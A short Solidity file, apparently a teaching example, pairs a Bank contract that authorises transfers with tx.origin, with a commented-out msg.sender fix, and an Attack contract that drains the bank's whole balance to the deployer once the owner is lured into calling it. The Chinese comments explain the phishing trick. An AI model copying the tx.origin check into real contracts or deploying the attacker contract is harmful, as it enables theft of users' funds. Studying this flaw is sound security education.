// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
contract Bank {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        require(tx.origin == owner, "Not owner");
        // 预计方法
        // require(msg.sender == owner,"Not owner");
        (bool sent,) = _to.call{value: _amount}("");
        require(sent, "Fail to send Ether");
    }
}

contract Attack{
    address payable public hacker;
    Bank bank;

    constructor(Bank _bank) {
        // 强制将_bank转换为Bank类型
        bank = Bank(_bank);
        // 将攻击者地址赋值成部署者
        hacker = payable(msg.sender);
    }

    function attack() public {
        // 诱导Bank合约的owner调用，使得合约的余额全部转移到黑客的地址址。
        bank.transfer(hacker, address(bank).balance);
    }
}